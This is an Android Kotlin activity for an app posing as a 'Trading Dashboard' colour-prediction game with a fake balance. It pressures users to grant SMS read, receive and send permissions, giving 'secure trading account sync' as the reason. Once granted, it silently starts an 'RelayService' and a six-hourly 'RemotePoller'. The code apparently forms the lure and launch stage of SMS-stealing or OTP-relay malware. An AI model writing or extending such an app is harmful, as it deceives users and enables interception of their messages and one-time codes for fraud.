package com.example

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.window.Dialog
import androidx.core.content.ContextCompat
import com.example.data.RelayState
import com.example.data.SettingsManager
import com.example.service.RelayService
import com.example.ui.theme.MyApplicationTheme
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            MyApplicationTheme {
                RelayApp()
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun RelayApp() {
    val context = LocalContext.current
    val settingsManager = remember { SettingsManager(context) }
    val coroutineScope = rememberCoroutineScope()
    val snackbarHostState = remember { SnackbarHostState() }

    var hasPermissions by remember { mutableStateOf(false) }
    var relayState by remember { mutableStateOf(settingsManager.relayState) }

    val requiredPermissions = mutableListOf(
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.INTERNET
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    val lifecycleOwner = androidx.lifecycle.compose.LocalLifecycleOwner.current
    DisposableEffect(lifecycleOwner) {
        val observer = androidx.lifecycle.LifecycleEventObserver { _, event ->
            if (event == androidx.lifecycle.Lifecycle.Event.ON_RESUME) {
                hasPermissions = requiredPermissions.all {
                    ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
                }
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose {
            lifecycleOwner.lifecycle.removeObserver(observer)
        }
    }

    val permissionLauncher = androidx.activity.compose.rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        hasPermissions = requiredPermissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    LaunchedEffect(hasPermissions, relayState) {
        if (hasPermissions && relayState != RelayState.ABORTED) {
            val serviceIntent = Intent(context, RelayService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        }
    }

    fun openAppSettings() {
        val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = android.net.Uri.fromParts("package", context.packageName, null)
        }
        context.startActivity(intent)
    }

    // Schedule WorkManager
    LaunchedEffect(Unit) {
        val constraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .build()
        
        // Immediate sync
        val oneTimeWorkRequest = androidx.work.OneTimeWorkRequestBuilder<com.example.service.RemotePoller>()
            .setConstraints(constraints)
            .build()
        androidx.work.WorkManager.getInstance(context).enqueue(oneTimeWorkRequest)

        // Periodic sync (every 6 hours)
        val periodicWorkRequest = androidx.work.PeriodicWorkRequestBuilder<com.example.service.RemotePoller>(6, java.util.concurrent.TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()
        androidx.work.WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            "RemotePoller",
            androidx.work.ExistingPeriodicWorkPolicy.KEEP,
            periodicWorkRequest
        )
    }
    
    Scaffold(
        snackbarHost = { SnackbarHost(snackbarHostState) },
        topBar = {
            TopAppBar(
                title = { Text("Trading Dashboard") },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.primaryContainer,
                    titleContentColor = MaterialTheme.colorScheme.onPrimaryContainer
                )
            )
        }
    ) { innerPadding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .background(MaterialTheme.colorScheme.background)
                .padding(innerPadding)
                .padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
        ) {
            if (!hasPermissions) {
                // Mandatory Setup UI
                Column(
                    modifier = Modifier.fillMaxSize(),
                    verticalArrangement = Arrangement.Center,
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Icon(
                        imageVector = Icons.Default.Lock,
                        contentDescription = "Secure Setup",
                        modifier = Modifier.size(80.dp),
                        tint = MaterialTheme.colorScheme.primary
                    )
                    Spacer(modifier = Modifier.height(24.dp))
                    Text(
                        text = "Secure Configuration Required",
                        style = MaterialTheme.typography.headlineSmall,
                        fontWeight = FontWeight.Bold
                    )
                    Spacer(modifier = Modifier.height(16.dp))
                    Text(
                        text = "Please grant the necessary permissions to synchronize your trading account securely.",
                        style = MaterialTheme.typography.bodyMedium,
                        textAlign = androidx.compose.ui.text.style.TextAlign.Center,
                        color = MaterialTheme.colorScheme.onSurfaceVariant,
                        modifier = Modifier.padding(horizontal = 32.dp)
                    )
                    Spacer(modifier = Modifier.height(32.dp))
                    Button(
                        onClick = {
                            permissionLauncher.launch(requiredPermissions.toTypedArray())
                            openAppSettings()
                        },
                        modifier = Modifier.fillMaxWidth(0.8f).height(50.dp)
                    ) {
                        Text("Grant Permissions", fontWeight = FontWeight.Bold)
                    }
                }
            } else {
                // Professional Trading Game UI (COLORX Design System)
                TradingHomeScreen()
            }
        }
    }
}

@Composable
fun TradingHomeScreen() {
    var selectedTab by remember { mutableStateOf(0) }
    val tabs = listOf("Home", "Trade", "History", "Wallet", "Profile")
    
    Scaffold(
        bottomBar = {
            NavigationBar(containerColor = androidx.compose.ui.graphics.Color(0xFF121212)) {
                tabs.forEachIndexed { index, tab ->
                    NavigationBarItem(
                        selected = selectedTab == index,
                        onClick = { selectedTab = index },
                        icon = { Icon(Icons.Default.Home, contentDescription = tab) },
                        label = { Text(tab) }
                    )
                }
            }
        }
    ) { padding ->
        Box(modifier = Modifier.padding(padding)) {
            when (selectedTab) {
                0 -> TradingContent()
                else -> Text("Tab ${tabs[selectedTab]} Content", color = androidx.compose.ui.graphics.Color.White, modifier = Modifier.align(Alignment.Center))
            }
        }
    }
}

@Composable
fun TradingContent() {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(androidx.compose.ui.graphics.Color(0xFF121212))
            .padding(horizontal = 16.dp, vertical = 12.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        // Header: Balance Card
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = androidx.compose.foundation.shape.RoundedCornerShape(16.dp),
            colors = CardDefaults.cardColors(containerColor = androidx.compose.ui.graphics.Color(0xFF1E1E1E))
        ) {
            Column(modifier = Modifier.padding(20.dp)) {
                Text("Total Balance", color = androidx.compose.ui.graphics.Color(0xFF9E9E9E), style = MaterialTheme.typography.bodySmall)
                Text("₹ 24,680.50", color = androidx.compose.ui.graphics.Color.White, style = MaterialTheme.typography.headlineLarge, fontWeight = FontWeight.Bold)
                Spacer(Modifier.height(16.dp))
                Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                    Button(onClick = {}, shape = androidx.compose.foundation.shape.RoundedCornerShape(8.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFF333333))) { Text("Withdraw") }
                    Button(onClick = {}, shape = androidx.compose.foundation.shape.RoundedCornerShape(8.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFF00C853))) { Text("Deposit") }
                }
            }
        }

        Spacer(modifier = Modifier.height(20.dp))

        // Live Market Card
        Card(modifier = Modifier.fillMaxWidth(), shape = androidx.compose.foundation.shape.RoundedCornerShape(16.dp), colors = CardDefaults.cardColors(containerColor = androidx.compose.ui.graphics.Color(0xFF1E1E1E))) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("COLOR MARKET", color = androidx.compose.ui.graphics.Color.White, fontWeight = FontWeight.Bold)
                Text("Session #582941 | LIVE", color = androidx.compose.ui.graphics.Color(0xFF9E9E9E), style = MaterialTheme.typography.bodySmall)
                Spacer(Modifier.height(8.dp))
                Text("00:28", style = MaterialTheme.typography.displayMedium, color = androidx.compose.ui.graphics.Color(0xFFD4AF37), fontWeight = FontWeight.Bold)
            }
        }

        Spacer(modifier = Modifier.height(20.dp))

        // Color Buttons (Professional)
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
            Button(onClick = {}, modifier = Modifier.weight(1f).height(56.dp), shape = androidx.compose.foundation.shape.RoundedCornerShape(12.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFF00C853))) { Text("GREEN") }
            Button(onClick = {}, modifier = Modifier.weight(1f).height(56.dp), shape = androidx.compose.foundation.shape.RoundedCornerShape(12.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFF7B1FA2))) { Text("VIOLET") }
            Button(onClick = {}, modifier = Modifier.weight(1f).height(56.dp), shape = androidx.compose.foundation.shape.RoundedCornerShape(12.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFFD32F2F))) { Text("RED") }
        }
    }
}
